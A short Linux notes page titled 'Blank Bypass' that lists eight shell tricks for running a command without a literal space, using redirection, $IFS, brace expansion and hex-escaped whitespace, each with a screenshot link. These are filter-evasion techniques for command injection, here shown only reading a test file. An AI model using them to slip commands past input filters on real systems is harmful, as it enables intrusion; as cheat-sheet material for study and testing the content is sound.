---
title: Blank Bypass
tags: linux
---
1. cat<1.txt

   ![](/images/black1.PNG)

2. cat$IFS$91.txt

   ![](/images/black2.PNG)

3. cat${IFS}1.txt

   ![](/images/black3.PNG)

4. cat<>1.txt

   ![](/images/black4.PNG)

5. {cat,1.txt}

   ![](/images/black5.PNG)

6. CMD=$'\x201.txt'&&cat$CMD

   ![](/images/black6.PNG)

7. CMD=$'\x0a1.txt'&&cat$CMD

   ![](/images/black7.PNG)

8. CMD=$'\x091.txt'&&cat$CMD

   ![](/images/black8.PNG)

